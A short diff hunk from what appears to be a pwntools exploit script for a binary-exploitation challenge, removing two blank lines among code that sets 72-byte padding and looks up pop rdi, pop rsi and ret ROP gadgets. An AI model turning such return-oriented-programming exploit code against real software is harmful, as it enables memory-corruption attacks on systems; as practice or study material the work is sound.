@@ -17,8 +17,6 @@ MaxLen = 256
 padding = 72 * "\x90"
 #ROPgadget --binary pwn | grep rdi
 
-
-
 pop_rsi = rop.find_gadget(["pop rsi"])[0]
 pop_rdi = rop.find_gadget(["pop rdi"])[0]
 ret = rop.find_gadget(["ret"])[0]
